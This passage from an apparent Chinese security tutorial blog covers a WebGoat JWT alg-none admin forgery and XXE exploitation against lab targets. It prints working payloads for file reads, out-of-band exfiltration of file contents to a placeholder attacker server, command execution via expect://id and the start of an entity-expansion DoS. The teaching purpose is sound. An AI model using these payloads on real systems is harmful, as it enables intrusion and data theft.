class="string">&quot;HS256&quot;</span>,</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；</li><li><code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</li><li>最后，将上面的 JSON 对象使用 Base64URL 算法转成字符串。</li></ul><h2 id="有效载荷Payload"><a href="#有效载荷Payload" class="headerlink" title="有效载荷Payload"></a>有效载荷Payload</h2><ul><li>Payload是一个JSON对象，用来存放实际需要传递的数据。<blockquote><p>JWT规定了7个官方字段：<br>iss (issuer)：签发人<br>exp (expiration time)：过期时间<br>sub (subject)：主题<br>aud (audience)：受众<br>nbf (Not Before)：生效时间<br>iat (Issued At)：签发时间<br>jti (JWT ID)：编号</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</li><li>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</li></ul><h2 id="签名Signature"><a href="#签名Signature" class="headerlink" title="签名Signature"></a>签名Signature</h2><ul><li>Signature是对前面两部分的前面，防止数据篡改。</li><li>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(</span><br><span class="line">  <span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  <span class="title function_">base64UrlEncode</span>(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure></li><li>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（<code>.</code>）分隔，就可以返回给用户。</li></ul><h2 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h2><ul><li>Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</li><li>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如<code> api.example.com/?token=xxx</code>）。Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</li></ul><h2 id="Refresh-token"><a href="#Refresh-token" class="headerlink" title="Refresh token"></a>Refresh token</h2><ul><li>JWT使用<code>refresh token</code>去刷新<code>access token</code>而无需再次身份验证。 <code>refresh token</code>的存活时间较长而<code>access token</code>的存活时间较短。</li><li>登陆时会获取 <code>access token</code>, <code>refresh token</code>：<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030164359.png" alt="image.png"></li><li>服务器中可能存在：未校验<code>access token</code>和<code>refresh token</code>是否属于同一个用户，导致A用户可使用自己的<code>refresh token</code>去刷新B用户的<code>access token</code></li></ul><h1 id="实例WebGoat-JWTtokens"><a href="#实例WebGoat-JWTtokens" class="headerlink" title="实例WebGoat-JWTtokens"></a>实例WebGoat-JWTtokens</h1><h2 id="lessen-03"><a href="#lessen-03" class="headerlink" title="lessen-03"></a>lessen-03</h2><ul><li>这一关直接给出JWT令牌，我们需要从中找出username，并填入文本框<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030223509.png" alt="image.png"></li><li>使用工具网站<a href="https://jwt.io/">https://jwt.io/</a></li><li>可以看见username就在当中，内容是user<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030223634.png" alt="image.png"></li><li>Congratulations. You have successfully completed the assignment.</li><li>祝贺你。你已经成功地完成了任务。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030223716.png" alt="image.png"></li></ul><h2 id="lessen-05"><a href="#lessen-05" class="headerlink" title="lessen-05"></a>lessen-05</h2><ul><li>这一关是使用管理员账户，重置投票<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030223825.png" alt="image.png"></li><li>使用tom账户，点击垃圾桶图标(Reset votes)，然后用抓包工具，修改access_token值</li><li>原本的access_token值为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">access_token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2OTk1NDA4MzYsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.GEiBddurt9oevq8htQTKWxXGqSNAZ89h8J1AoZn0lPT2ZLArIJ-3rZv_-1CsajQxw21MgNNvzTDab_IX_HPaRQ; </span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030224142.png" alt="image.png"></li><li>将alg值改为none，目的是不写签名，因为改了内容签名就不一样了</li><li>将admin值改为true，目的是将其标记为管理员</li><li>这个网站改不了，建议用burp的编码器改</li><li>其中符号都会被忽略，所有base64编码后的<code>=</code>都需要去掉，然后将签名也删了<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030224646.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231030224659.png" alt="image.png"></li></ul><h1 id="JWT安全防护"><a href="#JWT安全防护" class="headerlink" title="JWT安全防护"></a>JWT安全防护</h1><ul><li>修复算法，不允许客户端切换算法。</li><li>使用对称密钥对令牌进行签名时，确保使用适当的密钥长度。</li><li>确保添加到令牌的声明不包含个人信息。如果需要添加更多信息，也可以选择加密令牌。向项目添加足够的测试用例以验证无效令牌实际上不起作用。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> java安全 </tag>
            
            <tag> jwt安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE&amp;XML之利用检测绕过</title>
      <link href="/2023/10/23/XXE&amp;XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/"/>
      <url>/2023/10/23/XXE&amp;XML%E4%B9%8B%E5%88%A9%E7%94%A8%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023125144.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="XML基础概念"><a href="#XML基础概念" class="headerlink" title="XML基础概念"></a>XML基础概念</h2><ul><li>XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</li></ul><h2 id="XXE概念"><a href="#XXE概念" class="headerlink" title="XXE概念"></a>XXE概念</h2><ul><li>XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</li><li>例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。</li></ul><h2 id="XML与HTML的主要差异"><a href="#XML与HTML的主要差异" class="headerlink" title="XML与HTML的主要差异"></a>XML与HTML的主要差异</h2><ul><li>XML被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML被设计用来显示数据，其焦点是数据的外观。</li><li>HTML旨在显示信息，而XML旨在传输信息。</li></ul><h1 id="XML外部实体"><a href="#XML外部实体" class="headerlink" title="XML外部实体"></a>XML外部实体</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [&lt;!--定义此文档时note类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>&lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义to元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义from元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义head元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>&lt;!--定义body元素为&quot;#PCDATA&quot;类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>主要看一下<a href="http://www.w3school.com.cn/dtd/dtd_entities.asp">DTD-实体</a>。首先让我们了解一下基本的PAYLOAD结构：<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023140756.png" alt="image.png"></li><li><strong>DTD</strong>：Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。<blockquote><p>实体分为一般实体和参数实体</p><ol><li>一般实体的声明：<code>&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</code><br>引用一般实体的方法：<code>&amp;实体名称;</code><br>p.s.经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。</li><li>参数实体的声明：<code>&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</code><br>引用参数实体的方法：<code>%实体名称;</code><br>p.s.经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。</li></ol></blockquote></li><li>如果实体名称中出现如<code>&lt;</code>的特殊字符，解析就会失败。为了避免这种情况，XML用实体引用替换特殊字符。XML预定义了五个实体引用，即用<code>&lt;</code>、 <code>&gt;</code>、 <code>&amp;</code>、 <code>&amp;apos</code>、 <code>&quot;</code>替换<code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&#39;</code>、<code>&quot;</code>。</li></ul><h2 id="DTD实体声明"><a href="#DTD实体声明" class="headerlink" title="DTD实体声明"></a>DTD实体声明</h2><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><ul><li><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></li><li>当引用一般实体时，由三部分构成：<code>&amp;</code>、<code>实体名</code>、<code>；</code>，当是用参数传入xml的时候，<code>&amp;</code>需URL编码，不然<code>&amp;</code>会被认为是参数间的连接符号。</li><li>示例：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">writer</span> <span class="string">&quot;Dawn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="string">&quot;Copyright W3School.com.cn&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;writer;</span>©right;<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><ul><li><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></li><li>外部实体可支持http、file等协议。不同程序支持的协议不同，如下图：<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023142616.png" alt="image.png"></li><li>其中PHP支持的协议会更多一些，但是需要一定的扩展支持：<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023142853.png" alt="image.png"></li><li>示例：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span> encoding = <span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">copyright</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;file;</span>©right;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="XXE检测"><a href="#XXE检测" class="headerlink" title="XXE检测"></a>XXE检测</h1><ul><li>以pikachu靶场为例</li><li>主要的方法是检测所有接受XML作为输入内容端点，抓包观察其是否会返回我们想要的内容。</li><li>首先检测XML是否会被解析<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ </span><br><span class="line">&lt;!ENTITY words &quot;Hello XXE !&quot;&gt;]&gt;</span><br><span class="line">&lt;a&gt;&amp;words;&lt;/a&gt;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023145356.png" alt="image.png"></li><li>如果数据包或者页面显示“Hello XXE”的字样，说明表单实体被成功解析<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023145438.png" alt="image.png"></li></ul><h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><ul><li>以下利用主要基于<code>libxml2</code>版本，其中libxml是PHP的xml支持。  </li><li>而libxml版本在2.9.1及以后，默认不解析外部实体，很多利用将无法实现。</li></ul><h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><ul><li>最简单也是最常用的利用方式  </li><li>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</li></ul><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="引入外部实体"><a href="#引入外部实体" class="headerlink" title="引入外部实体"></a>引入外部实体</h4><ul><li>文件读取的利用就是使用file协议读取文件内容，并输出到页面上<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/zys.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231023150916.png" alt="image.png"></li></ul><h4 id="引入外部参数实体"><a href="#引入外部参数实体" class="headerlink" title="引入外部参数实体"></a>引入外部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.3.3/pikachu/vul/xxe/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- hack.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///d:/zys.txt&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h4><ul><li><strong>带外数据OOB</strong>(out—of—band data)，有时也称为加速数据(expedited data)</li><li>是指连接双方中的一方发生重要事情，想要迅速地通知对方。这种通知在已经排队等待发送的任何“普通”(有时称为“带内”)数据之前发送。带外数据设计为比普通数据有更高的优先级。带外数据是映射到现有的连接中的，而不是在客户机和服务器间再用一个连接。</li><li>先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</li><li><code>evil.dtd</code>的内容，内部的<code>%</code>号要进行实体编码成<code>&amp;#x25</code>。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span> <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; </span></span><br><span class="line"><span class="meta">%send; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>$send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- evil.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> </span></span><br><span class="line"><span class="meta"><span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span> </span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></li><li>首先对dtd引用目的是将外部文件<code>evil.dtd</code>引入到解释上下文中，然后执行<code>%all</code>，这时会检测<code>send实体</code>，在<code>root节点</code>中引用<code>send</code>，就可以成功实现数据转发了。</li><li>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</li></ul><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><ul><li>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。  </li><li>所以和OOB的构造方式几乎只有url处不同，其他地方一模一样。</li></ul><h5 id="通过引入服务器文件"><a href="#通过引入服务器文件" class="headerlink" title="通过引入服务器文件"></a>通过引入服务器文件</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- evil.dtd --&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;</span>&gt;</span> </span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><h5 id="通过引入本地文件"><a href="#通过引入本地文件" class="headerlink" title="通过引入本地文件"></a>通过引入本地文件</h5><ul><li>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是从外部引入DTD文件，并在其中定义一些实体内容就行。<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;/usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span> <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x25; eval &quot;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&quot;&gt; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;eval; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&amp;#x25;send; </span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&#x27;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote; </span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>第一个调用的参数实体是%remote，在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd文件中调用了%ISOamso;，在ISOamso定义的实体中相继调用了eval、和send</li></ul><h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><ul><li>和读文件差不多，只不过把URI改成内网机器地址</li><li>通过有xxe漏洞的网站，向其服务器内网进行判断是否开放，并且index.txt是否存在<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">xxe</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.3.3:80/index.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ul><li>在安装expect扩展的PHP环境里执行系统命令，当然其他协议也有可能可以执行系统命令<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h2><ul><li>支持实体测试：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">data</span> (<span class="keyword">#ANY</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a0 <span class="string">&quot;dos&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">a1</span> <span class="string">&quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span 